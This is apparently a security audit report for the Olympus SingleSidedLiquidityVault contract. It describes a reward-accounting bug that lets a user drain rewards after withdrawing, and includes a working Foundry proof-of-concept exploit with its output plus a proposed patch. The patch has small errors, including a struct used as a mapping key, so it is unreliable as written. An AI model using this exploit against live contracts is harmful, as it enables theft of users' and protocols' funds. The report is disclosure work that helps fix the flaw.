nobody2018

high

# Issue: user can still get same rewards after withdraw

## Summary

If **cachedUserRewardscachedUserRewards[user_] [rewardToken]** is greater than 0, this value will be added to the reward while **claimRewards** is called. This allows user to still get a lot of rewards after withdrawal. **The reason** for this problem is that **cachedUserRewardscachedUserRewards** is not **reset** after claimRewards.

## Vulnerability Detail

How to make **cachedUserRewardscachedUserRewards[user_] [rewardToken]** greater than 0? 

Let's assume that attacker  has deposited some pairToken. After a period of time, attacker calls SingleSidedLiquidityVault.withdraw  function and sets the claim_ parameter to false. The issue is in the _withdrawUpdateRewardState function. Let's look at its [code snippet](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L580-L590):

```solidity
//580-590 in SingleSidedLiquidityVault.sol

            InternalRewardToken memory rewardToken = internalRewardTokens[i];
            uint256 rewardDebtDiff = lpAmount_ * rewardToken.accumulatedRewardsPerShare;

            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {
                userRewardDebts[msg.sender][rewardToken.token] = 0;
                cachedUserRewards[msg.sender][rewardToken.token] +=	//here cachedUserRewards > 0
                    rewardDebtDiff -
                    userRewardDebts[msg.sender][rewardToken.token];
            } else {
                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;
            }
```

while **rewardDebtDiff** is bigger than **userRewardDebts[msg.sender][rewardToken.token],** **cachedUserRewards[msg.sender][rewardToken.token]** is assigned to rewardDebtDiff, userRewardDebts[msg.sender][rewardToken.token] is assigned to 0. After withdraw returns, attacker calls **claimRewards**. **internalRewardsForToken** calculates the number of rewards inside **claimRewards**. [code snippet](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L354-L372)

```solidity
//354-372 in SingleSidedLiquidityVault.sol
    function internalRewardsForToken(uint256 id_, address user_) public view returns (uint256) {
        InternalRewardToken memory rewardToken = internalRewardTokens[id_];
        uint256 lastRewardTime = rewardToken.lastRewardTime;
        uint256 accumulatedRewardsPerShare = rewardToken.accumulatedRewardsPerShare;

        if (block.timestamp > lastRewardTime && totalLP != 0) {
            uint256 timeDiff = block.timestamp - lastRewardTime;
            uint256 totalRewards = timeDiff * rewardToken.rewardsPerSecond;

            // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
            accumulatedRewardsPerShare += (totalRewards * 1e18) / totalLP;
        }

        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
        uint256 totalAccumulatedRewards = (lpPositions[user_] * accumulatedRewardsPerShare) -
            userRewardDebts[user_][rewardToken.token];	//never underflow, 

        return (cachedUserRewards[user_][rewardToken.token] + totalAccumulatedRewards) / 1e18;
    }
```

Finally, attacker got a lot of reward tokens that include internalToken and externalToken **without staking lptoken**. *Note: UserRewardDebts [user_] [rewardToken.token] is the value divided by 1e18, so calculating totalAccumulatedRewards will not revert.*

## Impact

This exploitation does not require any skills, users can easily exploit this vulnerability. Users with a large amount of capital can basically get risk-free income, just only keeping a little lptoken in the contract.

## Code Snippet

I wrote poc in bottom of **WstethLiquidityVaultFork.t.sol** file.

```solidity
function testMultiClaimDrainRewards() public {
        // Setup
        vm.prank(alice);
        liquidityVault.deposit(WSTETH_AMOUNT, 0);
        vm.prank(bob);
        liquidityVault.deposit(WSTETH_AMOUNT, 0);

        vm.warp(block.timestamp + 10); // Increase time 10 seconds so there are rewards

        uint256 lpAmount = liquidityVault.lpPositions(alice);
        emit log_named_decimal_uint("[1]total lpAmount=", lpAmount, 18);

        // Verify initial state
        assertEq(ldo.balanceOf(alice), 0);
        assertEq(reward2.balanceOf(alice), 0);
        assertEq(externalReward.balanceOf(alice), 0);

        vm.prank(alice);
        liquidityVault.withdraw(lpAmount - 1e18, minTokenAmounts_, false);
        assertEq(liquidityVault.lpPositions(alice), 1e18);
        emit log_named_decimal_uint("[2]userRewardDebts=", liquidityVault.userRewardDebts(alice, address(ldo)), 18);
        emit log_named_decimal_uint("[2]cachedUserRewards=", liquidityVault.cachedUserRewards(alice, address(ldo)), 18);
        // Claim rewards
        vm.prank(alice);
        liquidityVault.claimRewards();
        emit log_named_decimal_uint("[3]     ldo bal=", ldo.balanceOf(alice), 18);
        emit log_named_decimal_uint("[3]external bal=", externalReward.balanceOf(alice), 18);

        vm.warp(block.timestamp + 10);

        vm.prank(alice);
        liquidityVault.claimRewards();
        emit log_named_decimal_uint("[4]     ldo bal=", ldo.balanceOf(alice), 18);
        emit log_named_decimal_uint("[4]external bal=", externalReward.balanceOf(alice), 18);

        vm.warp(block.timestamp + 10);

        vm.prank(alice);
        liquidityVault.claimRewards();
        emit log_named_decimal_uint("[5]     ldo bal=", ldo.balanceOf(alice), 18);
        emit log_named_decimal_uint("[5]external bal=", externalReward.balanceOf(alice), 18);        
    }
    /*	output
[PASS] testMultiClaimDrainRewards() (gas: 1636448)
Logs:
  [1]total lpAmount=: 26.438818012912682040
  [2]userRewardDebts=: 0.000000000000000000
  [2]cachedUserRewards=: 4810884132658447041.079224978758479200
  [3]     ldo bal=: 5.000000000000100021
  [3]external bal=: 1.536444718556379274
  [4]     ldo bal=: 10.364447185563892864
  [4]external bal=: 3.109334155669127828
  [5]     ldo bal=: 16.093341556691378529
  [5]external bal=: 4.718668311338245663
Test result: ok. 1 passed; 0 failed; finished in 32.41s
    */
```

## Tool used

Manual Review

## Recommendation

cachedUserRewardscachedUserRewards[user_] [rewardToken] should be reset inside [_claimInternalRewards](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L623-L634).

cachedUserRewardscachedUserRewards[user_] [rewardToken] should be reset inside [[_claimExternalRewards](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L636-L648)].
```solidity
//my version
    function _claimInternalRewards(uint256 id_) internal {
        address rewardToken = internalRewardTokens[id_].token;
        uint256 reward = internalRewardsForToken(id_, msg.sender);	//The result is divided by 1e18
        uint256 fee = (reward * FEE) / PRECISION;
        
        uint256 cached = cachedUserRewards[msg.sender][rewardToken];
        if (cached > 0) {
            userRewardDebts[msg.sender][rewardToken] += reward * 1e18 - cached;
            cachedUserRewards[msg.sender][rewardToken] = 0;
        } else {
            userRewardDebts[msg.sender][rewardToken] += reward * 1e18;
        }
        
        accumulatedFees[rewardToken] += fee;

        if (reward > 0) ERC20(rewardToken).safeTransfer(msg.sender, reward - fee);

        emit RewardsClaimed(msg.sender, rewardToken, reward - fee);
    }

    function _claimExternalRewards(uint256 id_) internal {
        ExternalRewardToken storage rewardToken = externalRewardTokens[id_];
        uint256 reward = externalRewardsForToken(id_, msg.sender);	//The result is divided by 1e18
        uint256 fee = (reward * FEE) / PRECISION;

        uint256 cached = cachedUserRewards[msg.sender][rewardToken];
        if (cached > 0) {
            userRewardDebts[msg.sender][rewardToken] += reward * 1e18- cached;
            cachedUserRewards[msg.sender][rewardToken] = 0;
        } else {
            userRewardDebts[msg.sender][rewardToken] += reward * 1e18;
        }
        accumulatedFees[rewardToken.token] += fee;

        if (reward > 0) ERC20(rewardToken.token).safeTransfer(msg.sender, reward - fee);
        rewardToken.lastBalance = ERC20(rewardToken.token).balanceOf(address(this));

        emit RewardsClaimed(msg.sender, rewardToken.token, reward - fee);
    }
```